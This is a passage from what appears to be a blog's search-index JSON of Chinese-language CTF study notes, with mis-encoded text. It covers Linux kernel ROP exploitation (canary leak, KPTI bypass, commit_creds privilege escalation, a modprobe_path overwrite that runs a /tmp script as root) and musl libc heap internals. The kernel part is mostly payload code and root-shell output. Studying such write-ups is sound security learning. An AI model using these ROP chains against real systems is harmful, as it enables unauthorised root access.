[rax]å¯ä»¥å°†value_offsetè¯»å‡ºï¼Œæ”¾å…¥åˆ°raxä¸­ï¼Œä¹‹åè¿”å›ç”¨æˆ·æ€ï¼Œå°†raxçš„å­˜å…¥å˜é‡ä¸­ã€‚ payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rax; // return address payload[off++] = ksymtab_commit_creds; payload[off++] = read_mrax_pop; // rax \u003c-- [rax] payload[off++] = 0x0; //dummy rbp payload[off++] = kpti_pass; // swapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = (unsigned long)get_commit_creds; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; void get_prepare_kernel_cred() { __asm__( \".intel_syntax noprefix;\" \"mov tmp_store, rax;\" \".att_syntax;\" ); prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store; printf(\" --\u003e prepare_kernel_cred: %lx\\n\", prepare_kernel_cred); call_prepare_kernel_cred(); } æ³„éœ²çš„payloadç»“æ„å¦‚ä¸Šï¼Œè™½ç„¶ï¼Œkpti_passæœ‰ä¼špop raxä½†æ˜¯åœ¨è¿”å›åå…¶å€¼ä¾ç„¶ä¼šæ¢å¤ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#leak-prepare_kernel_cred--commit_creds"},{"categories":["Pwning"],"content":"Call prepare_kernel_cred() \u0026 commit_creds()åœ¨æˆ‘ä»¬æ³„éœ²åœ°å€åï¼Œä¹‹åå°±æ˜¯å¸¸è§„çš„ROPã€‚åœ¨commit_credsè¿”å›credsåï¼Œä¾ç„¶è¦å°†å…¶ä¿å­˜ã€‚å› ä¸ºä¹‹å‰è¿›è¡Œrax --\u003e rdiçš„gadgetéƒ½ä¸èƒ½ç”¨äº†ã€‚ payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rdi; // return address payload[off++] = 0; // rdi \u003c- 0 payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0) payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = (unsigned long)get_creds; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#call-prepare_kernel_cred--commit_creds"},{"categories":["Pwning"],"content":"Get root shell ! / $ id uid=1000 gid=1000 groups=1000 / $ ./exploit [*] Saved state [*] Opened device [*] Leaked 320 bytes [*] Cookie: a230d00be9113d00 [*] Prepared leak_commit_creds pa --\u003e commit_creds: ffffffffb2a [*] Prepared leak_prepare_kernel_ --\u003e prepare_kernel_cred: ffff [*] Prepared call_prepare_kernel_ [*] get cred [*] Prepared call_commit_creds pa [*] Returned to userland [*] UID: 0, got root! / # id uid=0 gid=0 / # cat /dev/sda hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs} ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:8:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#get-root-shell-"},{"categories":["Pwning"],"content":"Technique: Overwriting modprobe_path ä»€ä¹ˆæ˜¯modprobe? â€œmodprobe is a Linux program originally written by Rusty Russell and used to add a loadable kernel module to the Linux kernel or to remove a loadable kernel module from the kernelâ€ å½“æˆ‘ä»¬å®‰è£…æˆ–å¸è½½ä¸€ä¸ªå†…æ ¸æ¨¡å—æ—¶ï¼Œmodprobeå°±ä¼šè¢«æ‰§è¡Œã€‚è€Œå…¶é»˜è®¤è·¯å¾„modprobe_pathå°±æ˜¯/sbin/modprobe å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š / # cat /proc/sys/kernel/modprobe /sbin/modprobe modprobe_pathæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œè¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡/proc/kallsymså¾—åˆ°å®ƒã€‚ å½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªæœªçŸ¥ç±»å‹çš„æ–‡ä»¶ï¼Œmodprobe_pathæŒ‡å‘çš„æ–‡ä»¶å°±ä¼šè¢«æ‰§è¡Œ static int call_modprobe(char *module_name, int wait) { ... argv[0] = modprobe_path; argv[1] = \"-q\"; argv[2] = \"--\"; argv[3] = module_name; argv[4] = NULL; info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL, NULL, free_modprobe_argv, NULL); ... } å¦‚æœï¼Œå°†è·¯å¾„è¦†ç›–æŒ‡å‘æˆ‘ä»¬ç¼–å†™çš„shellè„šæœ¬ï¼Œå°±å®ç°äº†ä»¥rootæƒé™æ‰§è¡Œä»»æ„è„šæœ¬çš„ç›®çš„ã€‚ ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:0","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#technique-overwriting-modprobe_path"},{"categories":["Pwning"],"content":"Leak modprobe_pathç¬¬ä¸€æ­¥ï¼Œé¦–å…ˆæ³„éœ²åœ°å€ã€‚ canary = leak[16]; kernel_base = leak[38] - 0xa157ULL; kpti_pass = kernel_base + 0x200f10ULL + 22ULL; pop_rax = kernel_base + 0x4d11ULL; pop_rdi = kernel_base + 0x6370ULL; pop_rdx = kernel_base + 0x7616ULL; pop_rbx = kernel_base + 0x6158ULL; ksymtab_prepare_kernel_cred = kernel_base + 0xf8d4fcULL; ksymtab_commit_creds = kernel_base + 0xf87d90ULL; read_mrax_pop = kernel_base + 0x15a7fULL; modprobe_path = kernel_base + 0x1061820ULL; write_mrbx_rax_pop2 = kernel_base + 0x306dULL; //0xffffffff8100306d : mov qword ptr [rbx], rax ; pop rbx ; pop rbp ; ret ä¸ä¹‹å‰çš„å¹¶æ²¡æœ‰å¤ªå¤§å·®åˆ«ã€‚è¿™æ¬¡è¦å†™å†…å­˜ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªæ–°gadget ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:1","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#leak-modprobe_path"},{"categories":["Pwning"],"content":"Overwrite payload[off++] = canary; payload[off++] = 0x0; // rbx payload[off++] = 0x0; // r12 payload[off++] = 0x0; // rbp payload[off++] = pop_rax; // return address payload[off++] = 0x782f706d742f; // rax \u003c- \"/tmp/x\"; payload[off++] = pop_rbx; payload[off++] = modprobe_path; payload[off++] = write_mrbx_rax_pop2; // [rbx] \u003c-- rax payload[off++] = 0x0; //dummy rbp payload[off++] = 0x0; payload[off++] = kpti_pass; // swwapgs_restore_regs_and_return_to_usermode payload[off++] = 0; // dummy rax payload[off++] = 0; // dummy rdi payload[off++] = (unsigned long)get_flag; payload[off++] = user_cs; payload[off++] = user_rflags; payload[off++] = user_sp; payload[off++] = user_ss; ä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬è¦è®©åˆ›å»ºä¸€ä¸ªæœªçŸ¥ç±»å‹çš„æ–‡ä»¶ï¼Œè®©ç³»ç»Ÿæ‰§è¡Œï¼Œè¿™æ ·ç³»ç»Ÿå°±ä¼šå»æ‰§è¡Œæˆ‘ä»¬çš„/tmp/xã€‚æ‰€ä»¥æˆ‘ä»¬çš„è„šæœ¬è¦è¯»å‡ºflagã€‚ void get_flag(void){ puts(\"[*] Returned to userland, setting up for fake modprobe\"); system(\"echo '#!/bin/sh\\ncp /dev/sda /tmp/flag\\nchmod 777 /tmp/flag' \u003e /tmp/x\"); system(\"chmod +x /tmp/x\"); system(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' \u003e /tmp/dummy\"); system(\"chmod +x /tmp/dummy\"); puts(\"[*] Run unknown file\"); system(\"/tmp/dummy\"); puts(\"[*] Hopefully flag is readable\"); system(\"cat /tmp/flag\"); exit(0); } ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:2","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#overwrite"},{"categories":["Pwning"],"content":"Get flag ! / $ id uid=1000 gid=1000 groups=1000 / $ ./exploit [*] Saved state [*] Opened device [*] Leaked 320 bytes --\u003e Cookie: 3c8fec292491ab00 --\u003e Image base: ffffffff8c800000 [*] Prepared leak_commit_creds payload [*] Returned to userland, setting up for fake modprobe [*] Run unknown file /tmp/dummy: line 1: ï¿½ï¿½ï¿½ï¿½: not found [*] Hopefully flag is readable hxp{t0p_d3feNSeS_Vs_1337_h@ck3rs} ","date":"2021-08-22","objectID":"/linuxkernel-pwn-learning/:9:3","series":null,"tags":["Pwn","Kernel"],"title":"Linux Kernel-Pwn Learning","uri":"/linuxkernel-pwn-learning/#get-flag-"},{"categories":["Pwning"],"content":"musl libc pwnæµ…æåœ¨defconç»“æŸåï¼Œå›½å†…å¤–çš„å¾ˆå¤šæ¯”èµ›éƒ½å‡ºç°äº†musl libcçš„heap exploitï¼Œå‰å‡ å¤©çš„BSides Noida CTFä¸­çš„baby muslä¹Ÿä»¥3è§£å‘Šç»ˆã€‚æ‰€ä»¥æ‰¾äº†ä¸€ä¸ªæ—¶é—´å­¦ä¹ ä¸€ä¸‹ï¼Œå¤ç°äº†æ¯”èµ›ä¸­çš„é¢˜ç›®ã€‚ musl libc æ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºåµŒå…¥å¼ç³»ç»Ÿå¼€å‘çš„è½»é‡çº§ libc åº“ï¼Œä»¥ç®€å•ã€è½»é‡å’Œé«˜æ•ˆç‡ä¸ºç‰¹è‰²ã€‚æœ‰ä¸å°‘ Linux å‘è¡Œç‰ˆå°†å…¶è®¾ä¸ºé»˜è®¤çš„ libc åº“ï¼Œç”¨æ¥ä»£æ›¿ä½“ç§¯è‡ƒè‚¿çš„ glibc ï¼Œå¦‚Alpine Linuxã€OpenWrtå’Œ Gentoo ç­‰ã€‚ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:0:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#musl-libc-pwnæµ…æ"},{"categories":["Pwning"],"content":"æ•°æ®ç»“æ„","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#æ•°æ®ç»“æ„"},{"categories":["Pwning"],"content":"chunk struct chunk { size_t psize, csize; // ç›¸å½“äº glibc çš„ prev size å’Œ size struct chunk *next, *prev; }; chunkçš„ç»“æ„å¤§è‡´ä¸glibcç±»ä¼¼ï¼Œchunkä¹‹é—´ä¸ä¼šå¤ç”¨ä»»ä½•åŒºåŸŸã€‚psizeå’Œcsizeçš„æœ€åçš„1bitä¸ºinuseæ§åˆ¶ä½ã€‚è‹¥è®¾ç½®inuseæ ‡å¿—ä½ä¸º1ï¼Œè¡¨ç¤º chunk æ­£åœ¨è¢«ä½¿ç”¨ï¼›è‹¥æ²¡æœ‰è®¾ç½®inuseæ ‡å¿—ä½ï¼Œè¡¨ç¤º chunk å·²ç»è¢«é‡Šæ”¾æˆ–è€…é€šè¿‡mmapåˆ†é…çš„ï¼Œéœ€è¦é€šè¿‡psizeçš„æ ‡å¿—ä½æ¥è¿›ä¸€æ­¥åˆ¤æ–­ chunk çš„çŠ¶æ€ã€‚chunkä¸º0x20å­—èŠ‚å¯¹é½çš„ï¼ï¼ï¼ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:1","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#chunk"},{"categories":["Pwning"],"content":"mal static struct { volatile uint64_t binmap; struct bin bins[64]; volatile int free_lock[2]; } mal; malç»“æ„ä½“ç±»ä¼¼äº glibc ä¸­çš„arenaï¼Œè®°å½•ç€å †çš„çŠ¶æ€ï¼Œæœ‰ä¸‰ä¸ªæˆå‘˜ï¼š64ä½æ— ç¬¦å·æ•´æ•°binmapã€é“¾è¡¨å¤´éƒ¨æ•°ç»„binså’Œé”free_lockã€‚binmapè®°å½•æ¯ä¸ª bin æ˜¯å¦ä¸ºéç©ºï¼Œè‹¥æŸä¸ªæ¯”ç‰¹ä½ä¸º 1ï¼Œè¡¨ç¤ºå¯¹åº”çš„ bin ä¸ºéç©ºï¼Œå³ bin é“¾è¡¨ä¸­æœ‰ chunkã€‚ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:2","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#mal"},{"categories":["Pwning"],"content":"bin struct bin { volatile int lock[2]; struct chunk *head; struct chunk *tail; }; bin é“¾è¡¨å¤´éƒ¨çš„ç»“æ„å¦‚ä¸Šã€‚headå’ŒtailæŒ‡é’ˆåˆ†åˆ«æŒ‡å‘é¦–éƒ¨å’Œå°¾éƒ¨çš„ chunkï¼ŒåŒæ—¶é¦–éƒ¨ chunk çš„prevæŒ‡é’ˆå’Œå°¾éƒ¨ chunk çš„nextæŒ‡é’ˆæŒ‡å‘ bin é“¾è¡¨å¤´éƒ¨ï¼Œè¿™æ ·æ„æˆäº†å¾ªç¯é“¾è¡¨ã€‚å½“é“¾è¡¨ä¸ºç©ºæ—¶ï¼Œheadå’ŒtailæŒ‡é’ˆç­‰äº 0 æˆ–è€…æŒ‡å‘é“¾è¡¨å¤´éƒ¨è‡ªèº«ã€‚ bin ä¸‹æ ‡ i chunk å¤§å°ä¸ªæ•° chunk å¤§å°èŒƒå›´ ä¸‹æ ‡ i ä¸ chunk å¤§å°èŒƒå›´çš„å…³ç³» 0-31 1 0x20 â€“ 0x400 (i+1) * 0x20 32-35 8 0x420 â€“ 0x800 (0x420+(i-32) 0x100) ~ (0x500+(i-32) 0x100) 36-39 16 0x820 â€“ 0x1000 (0x820+(i-36) 0x200) ~ (0x1000+(i-36) 0x200) 40-43 32 0x1020 â€“ 0x2000 (0x1020+(i-40) 0x400) ~ (0x1400+(i-40) 0x400) 44-47 64 0x2020 â€“ 0x4000 (0x2020+(i-44) 0x800) ~ (0x2800+(i-44) 0x800) 48-51 128 0x4020 â€“ 0x8000 (0x4020+(i-48) 0x1000) ~ (0x5000+(i-48) 0x1000) 52-55 256 0x8020 â€“ 0x10000 (0x8020+(i-52) 0x2000) ~ (0xa000+(i-52) 0x2000) 56-59 512 0x10020 â€“ 0x20000 (0x10020+(i-56) 0x4000) ~ (0x14000+(i-56) 0x4000) 60-62 1024 0x20020 â€“ 0x38000 (0x20020+(i-60) 0x8000) ~ (0x28000+(i-60) 0x8000) 63 æ— é™ 0x38000 ä»¥ä¸Š 0x38000 ~ ä¸Šé¢æ˜¯æ¯ä¸ª bin çš„ chunk å¤§å°èŒƒå›´ï¼Œå¯ä»¥ä»æºç ä¸­çš„bin_index_upæ¨å¯¼å‡ºã€‚å‰ 32 ä¸ª bin ç±»ä¼¼ fastbin å’Œ small binï¼Œæ¯ä¸ª bin åªå¯¹åº”ä¸€ç§å¤§å°çš„ chunkï¼›å 32 ä¸ª bin åˆ™ç±»ä¼¼ large binï¼Œä¸€ä¸ª bin å¯¹åº”å¤šç§å¤§å°çš„ chunkã€‚ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:1:3","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#bin"},{"categories":["Pwning"],"content":"malloc void *malloc(size_t n) { struct chunk *c; int i, j; // ä½¿size nå¯¹é½ if (adjust_size(\u0026n) \u003c 0) return 0; if (n \u003e MMAP_THRESHOLD) { // nè¾¾åˆ°äº†mmapåˆ†é…çš„é˜ˆå€¼ï¼ˆ0x38000ï¼‰ï¼Œä½¿ç”¨mmapåˆ†é… size_t len = n + OVERHEAD + PAGE_SIZE - 1 \u0026 -PAGE_SIZE; char *base = __mmap(0, len, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); if (base == (void *)-1) return 0; c = (void *)(base + SIZE_ALIGN - OVERHEAD); c-\u003ecsize = len - (SIZE_ALIGN - OVERHEAD); c-\u003epsize = SIZE_ALIGN - OVERHEAD; return CHUNK_TO_MEM(c); } // è®¡ç®—sizeå¯¹åº”çš„binä¸‹æ ‡ i = bin_index_up(n); for (;;) { uint64_t mask = mal.binmap \u0026 -(1ULL\u003c\u003ci); // æŸ¥æ‰¾size \u003e nçš„æ‰€æœ‰bin if (!mask) { // æ²¡æœ‰èƒ½æ»¡è¶³è¦æ±‚çš„binï¼Œä½¿ç”¨expand_heapç”³è¯·æ–°chunk c = expand_heap(n); if (!c) return 0; if (alloc_rev(c)) { struct chunk *x = c; c = PREV_CHUNK(c); NEXT_CHUNK(x)-\u003epsize = c-\u003ecsize = x-\u003ecsize + CHUNK_SIZE(c); } break; } j = first_set(mask); // è·å–æœ€ç¬¦åˆçš„sizeå¯¹åº”çš„bin lock_bin(j); // å¯¹è¯¥binåŠ é” c = mal.bins[j].head; // å–å‡ºbinå¤´ if (c != BIN_TO_CHUNK(j)) { if (!pretrim(c, n, i, j)) unbin(c, j);//ä½¿ç”¨ pretrim åˆ†å‰² cï¼Œä½¿ç”¨ unbin ä»é“¾è¡¨ä¸­å–å‡º c unlock_bin(j); break; } unlock_bin(j); } // å›æ”¶ c ä¸­å¤§å°è¶…è¿‡ n çš„éƒ¨åˆ† /* Now patch up in case we over-allocated */ trim(c, n); return CHUNK_TO_MEM(c); } malloc è¯¦ç»†æ­¥éª¤ï¼š è°ƒæ•´ nï¼Œå¢åŠ å¤´éƒ¨é•¿åº¦å’Œå¯¹é½ 32 ä½ã€‚ å¦‚æœ n \u003e MMAP_THRESHOLDï¼Œä½¿ç”¨ mmap åˆ›å»ºä¸€å—å¤§å°ä¸º n çš„å†…å­˜ï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚ å¦‚æœ n \u003c= MMAP_THRESHOLDï¼Œè®¡ç®— nå¯¹åº”çš„ bin ä¸‹æ ‡ iï¼ŒæŸ¥æ‰¾ binmap å¦‚æœæ‰€æœ‰çš„å¯ç”¨ bin å‡ä¸ºç©ºï¼Œå»¶å±•å †ç©ºé—´ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„ chunk å¦‚æœå­˜åœ¨éç©ºçš„å¯ç”¨ binï¼Œé€‰æ‹©å¤§å°æœ€æ¥è¿‘ nçš„ bin jï¼Œå¾—åˆ° bin é“¾è¡¨é¦–éƒ¨çš„ chunk c å¦‚æœç¬¦åˆ pretrim æ¡ä»¶ï¼Œä½¿ç”¨ pretrim åˆ†å‰² c å¦åˆ™ä½¿ç”¨ unbin ä»é“¾è¡¨ä¸­å–å‡º c æœ€åå¯¹ chunk è¿›è¡Œ trimï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:2:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#malloc"},{"categories":["Pwning"],"content":"ubin static void unbin(struct chunk *c, int i) { if (c-\u003eprev == c-\u003enext) a_and_64(\u0026mal.binmap, ~(1ULL\u003c\u003ci)); c-\u003eprev-\u003enext = c-\u003enext; c-\u003enext-\u003eprev = c-\u003eprev; c-\u003ecsize |= C_INUSE; NEXT_CHUNK(c)-\u003epsize |= C_INUSE; } ubinç›¸å½“äºæ—©æœŸçš„unlinkæ²¡æœ‰å¯¹åŒå‘é“¾è¡¨è¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆä»»æ„åœ°å€å†™ã€‚ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:3:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#ubin"},{"categories":["Pwning"],"content":"pretrim /* pretrim - trims a chunk _prior_ to removing it from its bin. * Must be called with i as the ideal bin for size n, j the bin * for the _free_ chunk self, and bin j locked. */ static int pretrim(struct chunk *self, size_t n, int i, int j) { size_t n1; struct chunk *next, *split; /* We cannot pretrim if it would require re-binning. */ if (j \u003c 40) return 0; // åˆ†é…çš„binçš„å°æ ‡å°äº40 if (j \u003c i+3) { if (j != 63) return 0; // jæ˜¯æœ€åçš„binï¼Œchunkå®é™…å¤§å°ä¸åˆ†é…å¤§å°å·®å€¼è¶…è¿‡mmapé˜ˆå€¼ n1 = CHUNK_SIZE(self); if (n1-n \u003c= MMAP_THRESHOLD) return 0; } else { // iå’Œjç›¸éš”ä¸‰ä¸ªä»¥ä¸Šçš„bin n1 = CHUNK_SIZE(self); } // split çš„å¤§å°å±äº bin j èŒƒå›´å†…ï¼Œå³ split ä¸ self å±äºåŒä¸€ä¸ª bin if (bin_index(n1-n) != j) return 0; // åˆ‡å‰²å‡ºä¸€å—å¤§å°ä¸º n çš„ chunk next = NEXT_CHUNK(self); split = (void *)((char *)self + n); split-\u003eprev = self-\u003eprev; split-\u003enext = self-\u003enext; split-\u003eprev-\u003enext = split; split-\u003enext-\u003eprev = split; split-\u003epsize = n | C_INUSE; split-\u003ecsize = n1-n; next-\u003epsize = n1-n; self-\u003ecsize = n | C_INUSE; return 1; } pretrimç”¨äºå¯¹chunkè¿›è¡Œåˆ‡å‰²ï¼Œå‡†ç¡®æ¥è¯´å°±æ˜¯è®¾ç½®å¯¹åº”ä½ç½®çš„æ ‡å¿—ä½ç­‰ï¼Œé˜²æ­¢å°†è¶…å‡ºéœ€æ±‚çš„chunkç»™ç”¨æˆ·é€ æˆæµªè´¹ã€‚ä½¿å…¶è¿›è¡Œåˆ‡å‰²çš„æ¡ä»¶è¿˜æ˜¯å¾ˆä¸¥æ ¼çš„ï¼Œä¸€èˆ¬æ˜¯åˆ†é…å‡ºçš„chunkå¤§å°ä¸æ‰€éœ€chunkç›¸å·®å¾ˆå¤§çš„æ—¶å€™æ‰åˆ‡å‰²ã€‚ static void trim(struct chunk *self, size_t n) { size_t n1 = CHUNK_SIZE(self); struct chunk *next, *split; // chunk å®é™…çš„å¤§å° n1 å¤šäº n DONTCARE (0x10) å­—èŠ‚ if (n \u003e= n1 - DONTCARE) return; // å°† self çš„å¤§å°åˆ‡å‰²ä¸º nï¼Œå‰©ä½™éƒ¨åˆ†æˆä¸ºæ–°çš„ chunk split next = NEXT_CHUNK(self); split = (void *)((char *)self + n); split-\u003epsize = n | C_INUSE; split-\u003ecsize = n1-n | C_INUSE; next-\u003epsize = n1-n | C_INUSE; self-\u003ecsize = n | C_INUSE; __bin_chunk(split); } trimä¸»è¦ä½œç”¨æ˜¯å›æ”¶ chunk è¶…è¿‡éœ€æ±‚å¤§å°çš„éƒ¨åˆ†ã€‚trimå°† chunk å¤šä½™çš„éƒ¨åˆ†åˆ‡å‰²å‡ºæ¥ï¼Œç„¶åå°†å…¶é‡Šæ”¾åˆ° bin ä¸­ï¼Œå‡å°‘å†…å­˜æµªè´¹ã€‚ ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:4:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#pretrim"},{"categories":["Pwning"],"content":"free void free(void *p) { if (!p) return; struct chunk *self = MEM_TO_CHUNK(p); // è‹¥ csize æ²¡æœ‰è®¾ç½® inuse æ ‡å¿—ä½ï¼Œæ£€æŸ¥æ˜¯å¦ä¸º mmap chunk æˆ–è€… double free if (IS_MMAPPED(self)) unmap_chunk(self); else __bin_chunk(self); } static void unmap_chunk(struct chunk *self) { size_t extra = self-\u003epsize; char *base = (char *)self - extra; size_t len = CHUNK_SIZE(self) + extra; /* Crash on double free */ // å¦‚æœpsizeè®¾ç½®äº†inuseä½ï¼Œè¯´æ˜è¯¥chunkä¸æ˜¯æ¥ç€mmapåˆ†é…çš„ï¼Œdouble free if (extra \u0026 1) a_crash(); __munmap(base, len); } ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:5:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#free"},{"categories":["Pwning"],"content":"__bin_chunk void __bin_chunk(struct chunk *self) { struct chunk *next = NEXT_CHUNK(self); size_t final_size, new_size, size; int reclaim=0; int i; // new_size æ˜¯ self åŸæ¥çš„å¤§å°ï¼Œfinal_size æ˜¯ self åˆå¹¶ç©ºé—² chunk åçš„å¤§å° final_size = new_size = CHUNK_SIZE(self); // next_chunk ä¸­è®°å½•çš„psizeä¸selfçš„csizeä¸ç¬¦ /* Crash on corrupted footer (likely from buffer overflow) */ if (next-\u003epsize != self-\u003ecsize) a_crash(); // æ£€æŸ¥ self å‰åæ˜¯å¦æœ‰ç©ºé—² chunk for (;;) { if (self-\u003epsize \u0026 next-\u003ecsize \u0026 C_INUSE) { // è‹¥å‰åéƒ½åœ¨ä½¿ç”¨ä¸­ self-\u003ecsize = final_size | C_INUSE; next-\u003epsize = final_size | C_INUSE; i = bin_index(final_size); lock_bin(i); lock(mal.free_lock); if (self-\u003epsize \u0026 next-\u003ecsize \u0026 C_INUSE) // ç›´åˆ°å‰åéƒ½æ­£åœ¨ä½¿ç”¨ break; unlock(mal.free_lock); unlock_bin(i); } // å‘å‰åˆå¹¶ç©ºé—² chun if (alloc_rev(self)) { self = PREV_CHUNK(self); size = CHUNK_SIZE(self); final_size += size; if (new_size+size \u003e RECLAIM \u0026\u0026 (new_size+size^size) \u003e size) reclaim = 1; } // å‘ååˆå¹¶ç©ºé—² chunk if (alloc_fwd(next)) { size = CHUNK_SIZE(next); final_size += size; if (new_size+size \u003e RECLAIM \u0026\u0026 (new_size+size^size) \u003e size) reclaim = 1; next = NEXT_CHUNK(next); } } // åœ¨ binmap ä¸­ï¼Œå°† bin i è®¾ä¸ºéç©º bin if (!(mal.binmap \u0026 1ULL\u003c\u003ci)) a_or_64(\u0026mal.binmap, 1ULL\u003c\u003ci); self-\u003ecsize = final_size; next-\u003epsize = final_size; unlock(mal.free_lock); // å°† self åŠ å…¥åˆ° bin i é“¾è¡¨çš„å°¾éƒ¨ self-\u003enext = BIN_TO_CHUNK(i); self-\u003eprev = mal.bins[i].tail; self-\u003enext-\u003eprev = self; self-\u003eprev-\u003enext = self; /* Replace middle of large chunks with fresh zero pages */ if (reclaim) { uintptr_t a = (uintptr_t)self + SIZE_ALIGN+PAGE_SIZE-1 \u0026 -PAGE_SIZE; uintptr_t b = (uintptr_t)next - SIZE_ALIGN \u0026 -PAGE_SIZE; #if 1 __madvise((void *)a, b-a, MADV_DONTNEED); #else __mmap((void *)a, b-a, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0); #endif } unlock_bin(i); } ","date":"2021-08-22","objectID":"/musl-libc-pwn-learning/:6:0","series":null,"tags":["Pwn"],"title":"Musl Libc Pwn Learning","uri":"/musl-libc-pwn-learning/#__bin_chunk"},{"categories":["Pwning"],"content":"realloc void *realloc(void *p, size_t n) { struct chunk *self, *next; size_t n0, n1; void *new; if (!p) return malloc(n); if (adjust_size(\u0026n) \u003c 0) return 0; self = MEM_TO_CHUNK(p); n1 = n0 = CHUNK_SIZE(self); // mmaped chunk if (IS_MMAPPED(self)) { size_t extra = self-\u003epsize; char *base = (char *)self - extra; size_t oldlen = n0 + extra; size_t newlen = n + extra; /* Crash on realloc of freed chunk */ if (extra \u0026 1) a_crash(); if (newlen \u003c PAGE_SIZE \u0026\u0026 (new = malloc(n-OVERHEAD))) { n0 = n; goto copy_free_ret; } newlen = (newlen + PAGE_SIZE-1) \u0026 -PAGE_SIZE; if (oldlen == newlen) return p; base = __mremap(base, oldlen, newlen, MREMAP_MAYMOVE); if (base == (void *)-1) goto copy_realloc; self = (void *)(base + extra); self-\u003ecsize = newlen - extra; return CHUNK_TO_MEM(self); } next = NEXT_CHUNK(self); // sizeä¸ä¸€è‡´ /* Crash on corrupted footer (likely from buffer overflow) */ if (next-\u003epsize != self-\u003ecsize) a_crash(); /* Merge adjacent chunks if we need more space. This is not * a waste of time even if we fail to get enough space, because our * subsequent call to free would otherwise have to do the merge. */ if (n \u003e n1 \u0026\u0026 alloc_fwd(next)) { // å°è¯•å‘ååˆå¹¶ n1 += CHUNK_SIZE(next); next = NEXT_CHUNK(next); } /* FIXME: find what's wrong here and reenable it..? */ if (0 \u0026\u0026 n \u003e n1 \u0026\u0026 alloc_rev(self)) { // å°è¯•å‘å‰åˆå¹¶ self = PREV_CHUNK(self); n1 += CHUNK_SIZE(self); } self-\u003ecsize = n1 | C_INUSE; next-\u003epsize = n1 | C_INUSE; /* If we got enough space, split off the excess and return */ if (n \u003c= n1) { // å½“å‰chunkçš„sizeè¶³å¤Ÿå¤§ï¼Œåˆ‡å‰²å®ƒï¼Œç›´æ¥è¿”å› //memmove(CHUNK_TO_MEM(self), p, n0-OVERHEAD); trim(self, n); return CHUNK_TO_MEM(self); } copy_realloc: /* As a last resort, allocate a new chunk and copy to it. */ new = malloc(n-OVERHEAD); // å°è¯•äº†åˆå¹¶åï¼Œä»æ²¡æœ‰æ»¡è¶³è¦æ±‚ï¼Œç”³è¯·æ–°chunk if 